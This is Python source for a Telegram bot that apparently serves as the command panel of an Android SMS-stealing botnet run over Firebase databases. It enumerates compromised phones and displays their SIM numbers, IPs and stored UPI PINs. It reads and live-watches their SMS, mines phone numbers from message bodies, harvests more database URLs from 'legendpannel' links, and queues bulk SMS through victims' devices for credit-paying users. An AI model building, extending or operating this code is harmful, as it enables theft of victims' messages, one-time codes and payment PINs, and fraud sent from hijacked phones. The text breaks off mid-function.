#!/usr/bin/env python3
"""
Secure Firebase admin + SMS panel bot (Telegram).

Security model / roles (auto-detected per chat):
- Chat ID == TELEGRAM_ADMIN_CHAT_ID → full admin panel.
- Everyone else → user panel: registered in bot_users.json, can be
  banned with /ban; users can only send SMS (number required) and see
  their own history.
- No endpoints/ports opened; long-polling outbound only.
- Token read from env only (never stored in code/data files).
- Stored target URLs live in bot_urls.json next to this script.

Admin panel (inline buttons):
  URL Add / List / Remove / Analyze + SMS Panel + Devices + Databases + Users
User panel (inline buttons, auto role):
  📩 Send message (asks recipient number → text → confirm sender) +
  📬 My messages (live queued/picked-up status) + ❓ Help
SMS panel:
  list chats → open thread (last 10) → Refresh / Watch / Send
  Watch polls messages/{phone} every 12s and pushes new incoming messages.
  Send writes users/{deviceId}/sendSms for the matching device so the phone
  app picks it up, and mirrors the record into messages/{phone}.

Usage:
  export TELEGRAM_BOT_TOKEN="123456:ABC..."
  export TELEGRAM_ADMIN_CHAT_ID="123456789"
  python3 tb-pnl.py
"""

import base64
import html
import json
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple

import requests
from requests.adapters import HTTPAdapter

_SESSION = requests.Session()
_SESSION.headers.update({"User-Agent": "tb-pnl/1.0"})
_SESSION.mount("https://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
_SESSION.mount("http://", HTTPAdapter(pool_connections=100, pool_maxsize=100))

BASE = "https://api.telegram.org"
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "").strip()
HERE = os.path.dirname(os.path.abspath(__file__))
STORE = os.path.join(HERE, "bot_urls.json")
TIMEOUT = 20
MAX_PATHS_SHOW = 40
WATCH_INTERVAL = 12
MAX_PHONES_LIST = 30
MAX_THREAD = 10

if not TOKEN or not ADMIN_CHAT_ID:
    print("Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID first.")
    sys.exit(1)

try:
    from pnl_dcrt_loader import FirebaseEnumerator  # type: ignore
except Exception:
    import importlib.util

    _spec = importlib.util.spec_from_file_location("pnl", os.path.join(HERE, "pnl-dcrt.py"))
    _mod = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_mod)
    FirebaseEnumerator = _mod.FirebaseEnumerator


FIREBASE_URL_LIST_RE = re.compile(
    r"https?://[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.(?:firebaseio\.com|firebasedatabase\.app)", re.I
)

ACTIVE_DB = {"url": None}

POOL_STORE = os.path.join(HERE, "bot_pool.json")
MAX_SEND_COUNT = 25  # stepper/preset cap for bulk sends (normal users included)


def pool_urls() -> List[str]:
    """Firebase DBs the admin enabled for sending (user + admin bulk sends)."""
    stored = load_urls()
    saved = load_json(POOL_STORE, None)
    if saved is None:
        return list(stored)  # fresh boot (e.g. Render redeploy): all stored DBs sendable
    pool = [u for u in saved if u in stored]
    return pool or ([fb_base()] if fb_base() else [])


def set_pool(urls: List[str]) -> None:
    save_json(POOL_STORE, urls)


def short_host(url: str) -> str:
    return (url or "").split("//")[-1].split("/")[0][:30]


def parse_input(value: str) -> List[str]:
    """Accept a raw firebase URL, a plain URL, or a legendpannel ?m=/?s= link
    (base64 payload holding one or more firebase URLs). Returns firebase URLs."""
    value = (value or "").strip()
    found: List[str] = []
    for u in FIREBASE_URL_LIST_RE.findall(value):
        if u not in found:
            found.append(u)
    if found:
        return found
    m = re.search(r"[?&](?:m|s|data|db)=([A-Za-z0-9+/_=%-]+)", value)
    if m:
        raw = m.group(1)
        raw = raw.replace("%2B", "+").replace("%2b", "+").replace("%3D", "=")
        for decoder in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                txt = decoder(raw + "=" * (-len(raw) % 4)).decode("utf-8", "replace")
                break
            except Exception:
                txt = ""
        for u in FIREBASE_URL_LIST_RE.findall(txt):
            if u not in found:
                found.append(u)
    return found


# -----------------------------------------------------------
# store
# -----------------------------------------------------------

def load_urls() -> List[str]:
    try:
        with open(STORE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return [u for u in data.get("urls", []) if isinstance(u, str)]
    except Exception:
        return []


def save_urls(urls: List[str]):
    with open(STORE, "w", encoding="utf-8") as f:
        json.dump({"urls": urls}, f, indent=2)
    try:
        os.chmod(STORE, 0o600)
    except OSError:
        pass


# -----------------------------------------------------------
# telegram helpers
# -----------------------------------------------------------

def api(method: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    try:
        r = _SESSION.post(f"{BASE}/bot{TOKEN}/{method}", json=payload, timeout=(5, TIMEOUT))
        return r.json()
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def get_updates(offset: Optional[int]) -> Dict[str, Any]:
    params: Dict[str, Any] = {"timeout": TIMEOUT}
    if offset is not None:
        params["offset"] = offset
    try:
        r = _SESSION.get(f"{BASE}/bot{TOKEN}/getUpdates", params=params, timeout=(5, TIMEOUT + 5))
        return r.json()
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


MAIN_KB = {
    "inline_keyboard": [
        [{"text": "💬 SMS Panel", "callback_data": "smslist"}],
        [{"text": "📱 Devices", "callback_data": "devrefresh"}],
        [{"text": "🗂 Databases", "callback_data": "dbpanel"}],
        [{"text": "👥 Users", "callback_data": "users"}],
        [{"text": "🛡 Protection", "callback_data": "prot"}],
        [{"text": "➕ Add URL", "callback_data": "add"},
         {"text": "📋 List URLs", "callback_data": "list"}],
        [{"text": "🔎 Analyze All", "callback_data": "analyze"},
         {"text": "🗑 Remove", "callback_data": "remove"}],
        [{"text": "ℹ️ Help", "callback_data": "help"}],
    ]
}


def send(chat_id: int, text: str, kb: Optional[Dict] = None) -> Optional[int]:
    payload: Dict[str, Any] = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if kb is not None:
        payload["reply_markup"] = kb
    r = api("sendMessage", payload)
    try:
        return int(r.get("result", {}).get("message_id"))
    except Exception:
        return None


def answer_callback(callback_id: str, text: str = ""):
    api("answerCallbackQuery", {"callback_query_id": callback_id, "text": text})


def edit(chat_id: int, message_id: int, text: str, kb: Optional[Dict] = None):
    payload: Dict[str, Any] = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if kb is not None:
        payload["reply_markup"] = kb
    r = api("editMessageText", payload)
    if not r.get("ok"):
        send(chat_id, text, kb)


# -----------------------------------------------------------
# firebase helpers
# -----------------------------------------------------------

def fb_base() -> Optional[str]:
    urls = load_urls()
    if ACTIVE_DB.get("url") and ACTIVE_DB["url"] in urls:
        return ACTIVE_DB["url"].rstrip("/")
    return urls[0].rstrip("/") if urls else None


def fb_get_db(base: str, path: str, params: Optional[str] = None, timeout=(5, 12)) -> Any:
    base = (base or "").rstrip("/")
    if not base:
        return {"error": "no URL stored"}
    url = base + "/" + path.lstrip("/") + ".json" + (f"?{params}" if params else "")
    try:
        r = _SESSION.get(url, timeout=timeout)
        try:
            return r.json()
        except ValueError:
            return {"_status": r.status_code}
    except Exception as exc:
        return {"error": str(exc)}


def fb_get(path: str, params: Optional[str] = None, timeout=(5, 12)) -> Any:
    return fb_get_db(fb_base() or "", path, params, timeout)


def fb_put_db(base: str, path: str, body: Any, timeout=(5, 12)) -> Any:
    base = (base or "").rstrip("/")
    if not base:
        return {"error": "no URL stored"}
    url = base + "/" + path.lstrip("/") + ".json"
    try:
        r = _SESSION.put(url, json=body, timeout=timeout)
        try:
            return r.json()
        except ValueError:
            return {"_status": r.status_code}
    except Exception as exc:
        return {"error": str(exc)}


def fb_put(path: str, body: Any) -> Any:
    return fb_put_db(fb_base() or "", path, body)


def fb_patch(path: str, body: Any) -> Any:
    base = fb_base()
    if not base:
        return {"error": "no URL stored"}
    url = base + "/" + path.lstrip("/") + ".json"
    try:
        r = _SESSION.patch(url, json=body, timeout=(5, 12))
        try:
            return r.json()
        except ValueError:
            return {"_status": r.status_code}
    except Exception as exc:
        return {"error": str(exc)}


def fb_shallow(path: str) -> List[str]:
    data = fb_get(path, "shallow=true")
    if isinstance(data, dict) and "error" not in data:
        return [k for k, v in data.items() if v is True or v is not None]
    return []


def fb_shallow_db(base: str, path: str) -> List[str]:
    data = fb_get_db(base, path, "shallow=true")
    if isinstance(data, dict) and "error" not in data:
        return [k for k, v in data.items() if v is True or v is not None]
    return []


# (removed) resolve_targets embodied the wrong model: thread keys are DEVICE
# ids and `to` must be the typed recipient number, not the device's own SIM.
# Sends now go through queue_send() exactly like the web panel.


# -----------------------------------------------------------
# devices panel (mirrors legendpannel UI: all/online/offline, newest/oldest/name)
# -----------------------------------------------------------

DEV_FILTER = {"f": "all", "s": "new"}


def _first_number(*vals) -> Optional[str]:
    """First value that looks like a phone number. Deliberately NEVER reads
    command/sendSms/sms nodes — their number/phone/to fields are RECIPIENTS
    of queued outgoing sends, not the device's own number."""
    for v in vals:
        if v is None:
            continue
        s = str(v).strip()
        if s and s not in ("—", "-", "None", "null", "undefined", "?") and any(ch.isdigit() for ch in s):
            return s
    return None


def parse_devices(raw: Any) -> List[Dict[str, Any]]:
    devices: List[Dict[str, Any]] = []
    if not isinstance(raw, dict):
        return devices
    for dev_id, node in raw.items():
        if not isinstance(node, dict):
            continue
        sims_raw = node.get("sims")
        sims: List[Dict[str, Any]] = []
        sim_strings: List[str] = []
        if isinstance(sims_raw, list):
            for s in sims_raw:
                if isinstance(s, dict):
                    sims.append(s)
                elif s is not None:
                    n = _first_number(str(s))
                    if n and n not in sim_strings:
                        sim_strings.append(n)
        elif isinstance(sims_raw, dict):
            for s in sims_raw.values():
                if isinstance(s, dict):
                    sims.append(s)
                elif s is not None:
                    n = _first_number(str(s))
                    if n and n not in sim_strings:
                        sim_strings.append(n)
        sim_numbers: List[str] = list(sim_strings)
        for s in sims:
            n = _first_number(s.get("phoneNumber"), s.get("number"), s.get("phone"),
                              s.get("mobile"), s.get("msisdn"))
            if n and n not in sim_numbers:
                sim_numbers.append(n)
        top_number = _first_number(node.get("mobNo"), node.get("phone"), node.get("mobile"),
                                   node.get("number"), node.get("phoneNumber"), node.get("msisdn"),
                                   node.get("deviceNumber"), node.get("lineNumber"))
        battery = node.get("battery")
        battery_str = str(battery) if battery is not None else "-"
        try:
            battery_pct = int(str(battery_str).replace("%", "")) or 0
        except Exception:
            battery_pct = 0
        last_seen_raw = None
        for key in ("lastSeen", "last_seen", "lastOnline", "last_online",
                    "lastActive", "last_active", "timestamp", "time",
                    "dateTime", "updatedAt", "updated_at"):
            if key in node:
                last_seen_raw = node[key]
                break
        devices.append({
            "id": str(dev_id),
            "name": str(node.get("modelName") or node.get("model") or node.get("deviceName") or dev_id),
            "status": bool(node.get("status")),
            "battery": battery_str,
            "batteryPercent": battery_pct,
            "phoneNumber": top_number or (sim_numbers[0] if sim_numbers else None) or "-",
            "simNumbers": sim_numbers,
            "android": str(node.get("androidV") or node.get("androidVersion") or "-"),
            "ip": str(node.get("ip_address") or "-"),
            "storage": str(node.get("storage") or "-"),
            "provider": str(node.get("service_provider") or "-"),
            "sims": sims,
            "upipin": str(node.get("upipin")) if node.get("upipin") is not None else None,
            "cpu": str(node.get("cpu_arch") or "-"),
            "sdk": str(node.get("sdkV") or "-"),
            "lastSeen": last_seen_raw,
        })
    return devices


DEV_CACHE_TTL = 120
# NOTE: legacy _DEV_FETCH_LOCK removed — it serialized all DB fetches and could
# wedge under thread races. Cache is guarded by DEV_LOCK; workers use local locks.


POOL_CACHE: Dict[str, Any] = {"by_base": {}}  # base -> (ts, devices)


def fetch_devices(base: Optional[str] = None, force: bool = False) -> List[Dict[str, Any]]:
    """Fetch devices in parallel: shallow-id list, then each node concurrently
    with a short timeout. Falls back to users/All_User if clients is empty.
    base=None → active DB (legacy behavior). Each device is tagged with its db."""
    import copy
    base = ((base or fb_base()) or "").rstrip("/")
    if not base:
        return []
    now = time.time()
    with DEV_LOCK:
        entry = POOL_CACHE["by_base"].get(base)
        if not force and entry and now - entry[0] < DEV_CACHE_TTL and entry[1] is not None:
            return copy.deepcopy(entry[1])
    # network phase runs WITHOUT the global lock so many DBs fetch in parallel
    out: Dict[str, Any] = {}
    for path in ("clients", "users", "All_User", "devices"):
        ids = fb_shallow_db(base, path)
        if not ids:
            continue
        ids = ids[:60]
        lock = threading.Lock()

        def worker(dev_id: str, p: str = path, b: str = base):
            node = fb_get_db(b, f"{p}/{dev_id}", timeout=(3, 6))
            if isinstance(node, dict) and "error" not in node:
                with lock:
                    out[dev_id] = node

        threads = [threading.Thread(target=worker, args=(i,)) for i in ids]
        for t in threads:
            t.start()
        deadline = time.time() + 9
        for t in threads:
            t.join(timeout=max(0.2, deadline - time.time()))
        if out:
            break
    devices = parse_devices(out)
    for d in devices:
        d["db"] = base
    with DEV_LOCK:
        POOL_CACHE["by_base"][base] = (time.time(), devices)
        if base == (fb_base() or "").rstrip("/"):
            DEV_CACHE_STORE["devices"] = devices
            DEV_CACHE_STORE["ts"] = time.time()
    return devices


def fetch_all_devices(force: bool = False) -> List[Dict[str, Any]]:
    """Devices across every pool DB (admin-selected send pool), tagged with db.
    Scales to 80-100 DBs: bounded worker pool, adaptive deadline, partial
    results on timeout (never all-or-nothing)."""
    bases = pool_urls()
    if not bases:
        return []
    if len(bases) == 1:
        try:
            return fetch_devices(bases[0], force)
        except Exception:
            return []
    out: List[Dict[str, Any]] = []
    lock = threading.Lock()
    workers = min(32, len(bases))
    deadline = 10 + min(50, len(bases))  # ~60s max for 100 DBs, 10s for a few
    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(fetch_devices, b, force): b for b in bases}
            try:
                for fut in as_completed(futs, timeout=deadline):
                    try:
                        devs = fut.result(timeout=0)
                    except Exception:
                        continue
                    if devs:
                        with lock:
                            out.extend(devs)
            except Exception:
                pass  # deadline hit → keep partial results
    except Exception:
        pass
    return out


def devices_view(state: Dict[str, Any], devices: List[Dict[str, Any]]) -> str:
    f, s = state.get("f", "all"), state.get("s", "new")
    if f == "online":
        devices = [d for d in devices if d["status"]]
    elif f == "offline":
        devices = [d for d in devices if not d["status"]]
    if s == "name":
        devices = sorted(devices, key=lambda d: d["name"].lower())
    elif s == "battery":
        devices = sorted(devices, key=lambda d: d["batteryPercent"], reverse=True)
    elif s == "old":
        devices = sorted(devices, key=lambda d: d["id"])
    else:
        devices = sorted(devices, key=lambda d: d["id"], reverse=True)
    return devices


def devices_kb() -> Dict[str, Any]:
    f, s = DEV_FILTER["f"], DEV_FILTER["s"]
    mark = lambda x: ("• " if x else "") + x
    return {"inline_keyboard": [
        [{"text": f"{'📋' if f=='all' else ''} All", "callback_data": f"devf:all"},
         {"text": ("🟢 " if f == "online" else "") + "Online", "callback_data": "devf:online"},
         {"text": ("⚫ " if f == "offline" else "") + "Offline", "callback_data": "devf:offline"}],
        [{"text": ("🆕 " if s == "new" else "") + "Newest", "callback_data": "devs:new"},
         {"text": ("📅 " if s == "old" else "") + "Oldest", "callback_data": "devs:old"},
         {"text": ("🔤 " if s == "name" else "") + "Name", "callback_data": "devs:name"},
         {"text": ("🔋 " if s == "battery" else "") + "Battery", "callback_data": "devs:battery"}],
        [{"text": "🔙 Back", "callback_data": "back"}],
    ]}


def devices_screen(chat_id: int, message_id: Optional[int] = None, edit_msg: bool = True, devices: Optional[List[Dict[str, Any]]] = None):
    if devices is None:
        devices = fetch_devices()
    DEV_CACHE[chat_id] = devices
    view = devices_view(DEV_FILTER, devices)
    online = sum(1 for d in devices if d["status"])
    offline = len(devices) - online
    lines = [f"<b>📱 Devices</b> — total {len(devices)} | 🟢 {online} / ⚫ {offline}",
             f"filter=<b>{DEV_FILTER['f']}</b> sort=<b>{DEV_FILTER['s']}</b>", ""]
    if not view:
        lines.append("No devices match this filter. (The DB path <code>clients</code> may be empty — it's currently empty on tekoff.)")
    for d in view[:40]:
        marker = "🟢" if d["status"] else "⚫"
        lines.append(f"{marker} <b>{d['name']}</b> — 🔋{d['battery']} | {d['phoneNumber']}")
    kb = devices_kb()
    kb["inline_keyboard"] = [
        [{"text": d["name"][:24], "callback_data": f"dev:{d['id']}"}] for d in view[:12]
    ] + kb["inline_keyboard"]
    text = "\n".join(lines)
    if edit_msg and message_id is not None:
        edit(chat_id, message_id, text, kb)
    else:
        send(chat_id, text, kb)


def device_detail(dev_id: str, chat_id: int, message_id: Optional[int] = None):
    node = fb_get(f"clients/{dev_id}")
    if not isinstance(node, dict) or "error" in node:
        edit(chat_id, message_id, f"Device {dev_id} not found.", devices_kb())
        return
    dev = parse_devices({dev_id: node})[0]
    kb = {"inline_keyboard": [[{"text": "🔙 Devices", "callback_data": "devrefresh"}]]}
    text = (f"<b>{dev['name']}</b> ({'🟢 online' if dev['status'] else '⚫ offline'})\n"
            f"ID: <code>{dev['id']}</code>\n🔋 {dev['battery']} | 📱 {dev['phoneNumber']} ({dev['provider']})\n"
            f"🤖 {dev['android']} | sdk {dev['sdk']} | cpu {dev['cpu']}\n"
            f"🌐 {dev['ip']} | 💾 {dev['storage']}")
    if dev["lastSeen"] is not None:
        text += f"\n⏱ lastSeen: {dev['lastSeen']}"
    if dev["upipin"]:
        text += f"\nUPI pin: {dev['upipin']}"
    edit(chat_id, message_id, text, kb)


# -----------------------------------------------------------
# SMS panel
# -----------------------------------------------------------

def sms_threads(chat_id=None, message_id=None, online_only: bool = True) -> str:
    threads = fb_shallow("messages")
    if online_only:
        online_ids = {d["id"] for d in fetch_devices() if d["status"]}
        phones = [t for t in threads if t in online_ids]
        skipped = len(threads) - len(phones)
    else:
        phones = threads
        skipped = 0
    lines = ["<b>💬 Chats — 🟢 online devices only</b>"]
    if skipped:
        lines.append(f"({skipped} offline thread(s) hidden)")
    kb = {"inline_keyboard": []}
    for p in phones[:MAX_PHONES_LIST]:
        kb["inline_keyboard"].append([{"text": f"📱 {p}", "callback_data": f"thread:{p}"}])
    if not phones:
        lines.append("No online devices with chat threads.")
        kb["inline_keyboard"].append([{"text": "👀 Show all (incl. offline)", "callback_data": "smsall"}])
    kb["inline_keyboard"].append([{"text": "🔙 Back", "callback_data": "back"}])
    text = "\n".join(lines)
    if message_id is not None and chat_id is not None:
        edit(chat_id, message_id, text, kb)
    else:
        send(int(chat_id or ADMIN_CHAT_ID), text, kb)
    return ""


_NUM_WORD = r"(?:Number|नंबर|Nambhar|नम्बर|No\.?|Num)"
_CARRIERS = r"(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|VODAFONE|Idea|IDEA|BSNL|bsnl|MTNL|mtnl|Docomo|DOCOMO|Tata|Reliance|RELIANCE|Telenor|TELENOR|Uninor|UNINOR|Videocon|VIDEOCON)"
_MINING_PATTERNS = [
    rf"(?:{_CARRIERS})\s+{_NUM_WORD}\s*[:\-]\s*([6-9][0-9]{{9}})",
    r"(?:नंबर|नम्बर)\s*[:\-]\s*([6-9][0-9]{9})",
    r"(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})",
    r"(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})",
    r"Number\s*[:\-]\s*([6-9][0-9]{9})",
    r"registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})",
    r"(\+91[-\s]?[6-9][0-9]{9})",
    r"(?:\b91)([6-9][0-9]{9})\b",
    r"(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)",
]
_MINING_RES = [re.compile(p) for p in _MINING_PATTERNS]


def mine_number_from_text(text: str) -> Optional[str]:
    """Indian-mobile miner, ported 1:1 from the website's yh() extractor:
    first pattern that hits wins; returns normalized 10 digits or None."""
    if not text:
        return None
    for rx in _MINING_RES:
        m = rx.search(text)
        if m and m.group(1):
            d = re.sub(r"[^0-9]", "", m.group(1))
            if len(d) == 10 and d[0] in "6789":
                return d
            if len(d) == 12 and d.startswith("91") and d[2] in "6789":
                return d[2:]
    return None


def mine_device_number(dev_id: str, limit: int = 50) -> Optional[str]:
    """Last-resort fallback, same as the website (o.phoneNumbers[0]): first
    number mined from the device's recent message texts, newest first."""
    try:
        data = fb_get(f"messages/{dev_id}", f"orderBy=%22$key%22&limitToLast={limit}")
        if not isinstance(data, dict) or "error" in data:
            return None
        keys = sorted(data.keys(), key=lambda k: int(k) if str(k).isdigit() else 0, reverse=True)
        for k in keys:
            msg = data[k]
            if isinstance(msg, dict):
                n = mine_number_from_text(str(msg.get("message", "")))
                if n:
                    return n
    except Exception:
        pass
    return None


def device_info(dev_id: str) -> Dict[str, Any]:
    """Single-device lookup for thread headers (active DB): name, number, SIMs,
    battery, online status. One cheap GET, reused parse logic."""
    try:
        node = fb_get(f"clients/{dev_id}")
        if isinstance(node, dict) and "error" not in node:
            devs = parse_devices({dev_id: node})
            if devs:
                devs[0]["db"] = fb_base() or ""
                return devs[0]
    except Exception:
        pass
    return {"id": dev_id, "name": dev_id, "status": False, "battery": "-",
            "phoneNumber": "-", "android": "-", "provider": "-", "sims": []}


def thread_header(dev_id: str) -> str:
    info = device_info(dev_id)
    dot = "🟢" if info.get("status") else "⚫"
    sims = info.get("sims") or []
    parts: List[str] = []
    for i, s in enumerate(sims[:3]):
        if not isinstance(s, dict):
            continue
        slot = s.get("slot", s.get("simSlot", s.get("index", s.get("id", i + 1))))
        num = _first_number(s.get("phoneNumber"), s.get("number"), s.get("phone"),
                            s.get("mobile"), s.get("msisdn")) or "?"
        car = str(s.get("carrier", s.get("carrierName", s.get("operator", "")))).strip()
        label = f"SIM{slot} {num}"
        if car and car.lower() not in ("null", "none", "unknown", "-"):
            label += f" ({car})"
        parts.append(label)
    for n in (info.get("simNumbers") or [])[:3]:
        if n not in " ".join(parts):
            parts.append(n)
    sims_txt = ", ".join(parts) if parts else "-"
    number = str(info.get("phoneNumber") or "-")
    mined = False
    if number == "-":
        # website parity: fall back to numbers mined from SMS bodies
        hit = mine_device_number(dev_id)
        if hit:
            number = hit
            mined = True
    num_line = f"📞 <code>{html.escape(number)}</code>"
    if number == "-":
        num_line += " <i>(no number anywhere — not even in messages)</i>"
    return (
        f"<b>💬 {html.escape(str(info.get('name') or dev_id))}</b> {dot}\n"
        f"{num_line} · "
        f"🔋 {html.escape(str(info.get('battery') or '-'))} · "
        f"🤖 {html.escape(str(info.get('android') or '-'))}\n"
        f"SIMs: {html.escape(sims_txt)} · <code>{dev_id}</code>"
    )


def sms_thread(phone: str, chat_id=None, message_id=None) -> str:
    data = fb_get(f"messages/{phone}")
    kb_rows = [
        [{"text": "🔄 Refresh", "callback_data": f"thread:{phone}"},
         {"text": "👁 Watch", "callback_data": f"watch:{phone}"}],
        [{"text": "✉️ Send", "callback_data": f"send:{phone}"},
         {"text": "🔙 Back", "callback_data": "smslist"}],
    ]
    if not isinstance(data, dict) or "error" in data:
        msg = f"{thread_header(phone)}\n\nNo messages yet."
        if message_id is not None and chat_id is not None:
            edit(chat_id, message_id, msg, {"inline_keyboard": kb_rows})
        else:
            send(int(chat_id or ADMIN_CHAT_ID), msg, {"inline_keyboard": kb_rows})
        return msg
    try:
        items = sorted(data.items(), key=lambda kv: int(kv[0]) if str(kv[0]).isdigit() else 0)[-MAX_THREAD:]
    except Exception:
        items = list(data.items())[-MAX_THREAD:]
    lines = [thread_header(phone), f"— last {len(items)}:"]
    for mid, msg in items:
        if not isinstance(msg, dict):
            continue
        kind = "⬅️" if msg.get("type") == "incoming" else "➡️"
        dt = msg.get("dateTime", "")
        sender = msg.get("sender", "")
        text = str(msg.get("message", "")).replace("\n", " ")[:220]
        lines.append(f"{kind} <i>{dt}</i> <b>{sender}</b>: {text}")
    final = "\n".join(lines)
    if message_id is not None and chat_id is not None:
        edit(chat_id, message_id, final, {"inline_keyboard": kb_rows})
    else:
        send(int(chat_id or ADMIN_CHAT_ID), final, {"inline_keyboard": kb_rows})
    return ""


WATCH = {"on": False, "phone": "", "ids": set(), "chat": None}
WATCH_STOP = threading.Event()


def watch_loop():
    while not WATCH_STOP.is_set():
        try:
            if WATCH["on"] and WATCH["chat"]:
                ids = set(fb_shallow(f"messages/{WATCH['phone']}"))
                new = ids - WATCH["ids"]
                if new:
                    for nid in sorted(new, key=lambda x: int(x) if str(x).isdigit() else 0)[-5:]:
                        msg = fb_get(f"messages/{WATCH['phone']}/{nid}")
                        if isinstance(msg, dict) and "error" not in msg:
                            kind = "⬅️ New incoming" if msg.get("type") == "incoming" else "➡️ New outgoing"
                            send(int(WATCH["chat"]), f"{kind} <b>{msg.get('sender','')}</b>: {str(msg.get('message',''))[:220]}")
                WATCH["ids"] = ids
        except Exception as exc:
            print("watch error:", exc)
        time.sleep(WATCH_INTERVAL)


def start_watch(phone: str, chat_id: int):
    WATCH["on"] = True
    WATCH["phone"] = phone
    WATCH["chat"] = chat_id
    WATCH["ids"] = set(fb_shallow(f"messages/{phone}"))
    send(chat_id, f"👁 Watching <b>{phone}</b> for new messages (every {WATCH_INTERVAL}s). Use ⏹ Stop to end.", {"inline_keyboard": [[{"text": "⏹ Stop watch", "callback_data": "watchoff"}]]})


def stop_watch(chat_id: int):
    WATCH["on"] = False
    WATCH["chat"] = None
    send(chat_id, "Watch stopped.", MAIN_KB)


ADM_DRAFT: Dict[int, Dict[str, Any]] = {}  # admin chat -> {"dev":..., "to":..., "text":..., "sim":...}
ADMIN_CANCEL_KB = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": "smslist"}]]}


def queue_send(dev_id: str, target: str, text: str, sim: int = 1, base: Optional[str] = None,
               admin: bool = False) -> tuple:
    """Panel-exact send: PUT clients/{id}/webhookEvent/sendSms with
    {from: <sim slot>, to: <number>, message, isSended: false},
    then read the node back to verify. base=None → active DB.
    Returns (ok, detail). Admin sends bypass protection (with warning upstream)."""
    hit = prot_matches(target)
    if hit and not admin:
        return False, f"🛡 recipient {hit} is protected by admin"
    base = (base or fb_base() or "").rstrip("/")
    if not base:
        return False, "no database configured"
    payload = {"from": sim, "to": target, "message": text, "isSended": False}
    r = fb_put_db(base, f"clients/{dev_id}/webhookEvent/sendSms", payload)
    if isinstance(r, dict) and r.get("error"):
        return False, f"write failed: {r['error']}"
    back = fb_get_db(base, f"clients/{dev_id}/webhookEvent/sendSms")
    if not (isinstance(back, dict) and back.get("message") == text and str(back.get("to")) == str(target)):
        return False, f"verify failed — device node does not show our message (got: {str(back)[:120]})"
    now = int(time.time() * 1000)
    fb_put_db(base, f"messages/{dev_id}/{now}", {"id": now, "dateTime": time.strftime("%d-%m-%Y | %I:%M %p"), "message": text, "sender": "me", "type": "outgoing"})
    return True, "queued on device — waiting for the phone app to send it"


def progress_bar(frac: float, width: int = 10) -> str:
    frac = max(0.0, min(1.0, frac))
    filled = int(round(frac * width))
    return "█" * filled + "░" * (width - filled) + f" {int(frac * 100)}%"


def online_devices() -> List[Dict[str, Any]]:
    """Online devices across the whole send pool (all admin-enabled DBs)."""
    try:
        return [d for d in fetch_all_devices() if d.get("status")]
    except Exception:
        return []


def _user_pickup(user_id: int, marker: Dict[str, Any]) -> None:
    """Watchdog: frees the per-user send slot after USER_SEND_TIMEOUT,
    aborts the running send thread (stop-event) and notifies the user."""
    waited = 0
    while waited < USER_SEND_TIMEOUT and USER_ACTIVE.get(user_id) is marker and not marker["ev"].is_set():
        time.sleep(5)
        waited += 5
    if USER_ACTIVE.get(user_id) is marker:
        marker["ev"].set()
        USER_ACTIVE.pop(user_id, None)
        try:
            send(user_id, f"⏳⌛ <b>Send timed out</b> after {USER_SEND_TIMEOUT // 60} min — "
                          f"the senders were too slow to take all messages. You're free to send again.")
        except Exception:
            pass


def _user_marker(user_id: Any) -> Optional[Dict[str, Any]]:
    """Active-send marker of this user (None when unknown)."""
    return USER_ACTIVE.get(user_id) if user_id is not None else None


def run_bulk_send(chat_id: int, message_id: Optional[int], to: str, text: str,
                  targets: List[Dict[str, str]], sim: int, admin: bool, user_id: Any = None,
                  capped_note: str = "", qty: Optional[int] = None) -> None:
    """Queue messages with a live progress animation.
    targets = [{"db": base, "id": dev}] (one command slot per device, any DB).
    qty=None → legacy mode: exactly one message per device slot.
    qty=N → spread N messages across all devices (round-robin shards)."""
    kb = MAIN_KB if admin else USER_KB
    hit = prot_matches(to)
    if hit and not admin:
        # one clean block, no progress bar, no per-device failures, no Firebase
        body = f"🛡 <b>Not allowed:</b> <code>{html.escape(hit)}</code> is protected by the admin."
        if message_id is not None:
            edit(chat_id, message_id, body, kb)
        else:
            send(chat_id, body, kb)
        return
    total = len(targets)
    sends_planned = int(qty) if qty else total
    # credits double-gate (defense in depth; admin pays nothing)
    if not admin and user_id is not None:
        cbal = get_credits(user_id)
        cneed = credit_tokens(sends_planned)
        if cbal < cneed:
            body = (f"🪙 <b>Not enough credits.</b>\nBalance: <b>{cbal}</b> ({cbal * SENDS_PER_CREDIT} sends) · "
                    f"needed: <b>{cneed}</b> credit{'s' if cneed != 1 else ''} for {sends_planned} sends.\n"
                    f"Ask the admin for more credits.")
            if message_id is not None:
                edit(chat_id, message_id, body, kb)
            else:
                send(chat_id, body, kb)
            return
    if qty is not None:
        run_qty_send(chat_id, message_id, to, text, targets, sim, admin, user_id, capped_note, int(qty))
        return
    marker = _user_marker(None if admin else user_id)
    if marker:
        threading.Thread(target=_user_pickup, args=(user_id, marker), daemon=True).start()
    ok_list: List[Dict[str, str]] = []
    fail_list: List[str] = []
    last_edit = 0.0

    def show(i: int, force: bool = False):
        nonlocal last_edit
        now = time.time()
        if not force and now - last_edit < 1.0:
            return
        last_edit = now
